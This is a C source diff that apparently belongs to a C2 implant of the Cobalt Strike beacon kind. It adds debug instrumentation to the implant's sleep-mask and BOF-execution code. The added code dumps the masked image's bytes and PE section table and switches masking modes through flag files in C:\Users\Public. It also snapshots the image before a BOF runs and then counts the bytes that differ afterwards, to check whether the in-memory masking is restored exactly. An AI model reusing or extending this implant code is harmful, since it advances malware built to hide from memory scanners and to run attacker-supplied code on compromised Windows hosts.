@@ -370,6 +370,8 @@ static DWORD sm_clamp_sections(GARGLEP * gp) {
 
 static DWORD g_sm_spanraw;
 static DWORD g_sm_img;
+static char * g_sm_snap;
+static DWORD g_sm_snaplen;
 
 static void sm_dump_gparms(GARGLEP * gp, char * bof, SIZE_T blen, DWORD t,
 	DWORD sm_mode, DWORD sm_span, void * entryp) {
@@ -412,6 +414,31 @@ static void sm_dump_gparms(GARGLEP * gp, char * bof, SIZE_T blen, DWORD t,
 	sm_dump_prots(buf, &n, gp->sections, "q_sect:");
 	sm_dump_prots(buf, &n, gp->heap_records, "q_heap:");
 	sm_dump_prots(buf, &n, bof, "q_bof:");
+	/* live bytes at the killer range and the in-memory PE section table */
+	if (bof != NULL) { /* marker that gp->beacon_ptr is valid too */
+		unsigned __int64 v5 = *(unsigned __int64 *)(gp->beacon_ptr + 0x62000);
+		unsigned __int64 v6 = *(unsigned __int64 *)(gp->beacon_ptr + 0x63000);
+		unsigned short lfanew;
+		int sec;
+		n += wsprintfA(buf + n, "k62000=%08X%08X k63000=%08X%08X\r\n",
+			(unsigned)(v5 >> 32), (unsigned)v5, (unsigned)(v6 >> 32), (unsigned)v6);
+		memcpy(&lfanew, gp->beacon_ptr + 0x3C, sizeof(lfanew));
+		if (lfanew > 0 && lfanew < 0x400) {
+			unsigned short nsec;
+			DWORD sectbl = lfanew + 24 + *(unsigned int *)(gp->beacon_ptr + lfanew + 20);
+			memcpy(&nsec, gp->beacon_ptr + lfanew + 6, sizeof(nsec));
+			n += wsprintfA(buf + n, "nsec=%u\r\n", nsec);
+			for (sec = 0; sec < nsec && sec < 8; sec++) {
+				unsigned int vs, va;
+				char nm[9];
+				memcpy(nm, gp->beacon_ptr + sectbl + sec * 40, 8);
+				nm[8] = 0;
+				memcpy(&vs, gp->beacon_ptr + sectbl + sec * 40 + 8, 4);
+				memcpy(&va, gp->beacon_ptr + sectbl + sec * 40 + 12, 4);
+				n += wsprintfA(buf + n, "mem[%u] %-8s va=%06X vs=%06X\r\n", sec, nm, va, vs);
+			}
+		}
+	}
 	if (entryp != NULL) {
 		unsigned __int64 v = *(unsigned __int64 *)entryp;
 		n += wsprintfA(buf + n, "entry=%p bytes=%08X%08X\r\n",
@@ -852,6 +879,24 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 							}
 						}
 					}
+					/* sm_skip5: mask everything except pair index 5.
+					   sm_only5: mask pair index 5's range alone. */
+					if (GetFileAttributesA("C:\\Users\\Public\\sm_skip5") != INVALID_FILE_ATTRIBUTES) {
+						sm_mode |= 0x4000;
+						if (gparms != NULL && gparms->sections != NULL) {
+							gparms->sections[10] = 0;
+							gparms->sections[11] = 0;
+						}
+					}
+					if (GetFileAttributesA("C:\\Users\\Public\\sm_only5") != INVALID_FILE_ATTRIBUTES) {
+						sm_mode |= 0x8000;
+						if (gparms != NULL && gparms->sections != NULL) {
+							gparms->sections[0] = gparms->sections[10];
+							gparms->sections[1] = gparms->sections[11];
+							gparms->sections[2] = 0;
+							gparms->sections[3] = 0;
+						}
+					}
 					sm_span = sm_max_end(gparms);
 					g_sm_spanraw = sm_span;
 					g_sm_img = sm_image_size(gparms ? gparms->beacon_ptr : NULL);
@@ -880,6 +925,14 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 					}
 					if ((sm_mode & 32) != 0)
 						t = 1;
+					/* snapshot the image so the POST write can prove whether
+					 * the unmask walk restored it byte-for-byte */
+					if (gparms != NULL && sm_span != 0) {
+						g_sm_snaplen = sm_span;
+						g_sm_snap = (char *)malloc(sm_span);
+						if (g_sm_snap != NULL)
+							memcpy(g_sm_snap, gparms->beacon_ptr, sm_span);
+					}
 				}
 #endif
 				if (gparms == NULL)
@@ -893,17 +946,38 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 #endif
 #if defined(_M_X64)
 				/* breadcrumb: proves the BOF returned (crash inside invoke
-				 * never reaches this write) */
+				 * never reaches this write); diffs the image against the
+				 * pre-invoke snapshot to test restore fidelity */
 				if (gparms != NULL) {
 					HANDLE ph = CreateFileA("C:\\Users\\Public\\sm_post.txt",
 						FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS,
 						FILE_ATTRIBUTE_NORMAL, NULL);
 					if (ph != INVALID_HANDLE_VALUE) {
-						char lb[64];
+						char lb[160];
 						DWORD wr2;
 						int ln = wsprintfA(lb, "returned t=%u\r\n", t);
+						if (g_sm_snap != NULL && g_sm_snaplen != 0) {
+							DWORD i3;
+							DWORD firstdiff = g_sm_snaplen;
+							unsigned int diffs = 0;
+							for (i3 = 0; i3 < g_sm_snaplen; i3++) {
+								if ((unsigned char)g_sm_snap[i3] !=
+										(unsigned char)gparms->beacon_ptr[i3]) {
+									if (firstdiff == g_sm_snaplen)
+										firstdiff = i3;
+									diffs++;
+								}
+							}
+							ln += wsprintfA(lb + ln, "diffs=%u first=%06X\r\n",
+								diffs, firstdiff);
+						}
 						WriteFile(ph, lb, (DWORD)ln, &wr2, NULL);
 						CloseHandle(ph);
+					}
+					if (g_sm_snap != NULL) {
+						free(g_sm_snap);
+						g_sm_snap = NULL;
+						g_sm_snaplen = 0;
 					}
 				}
 #endif
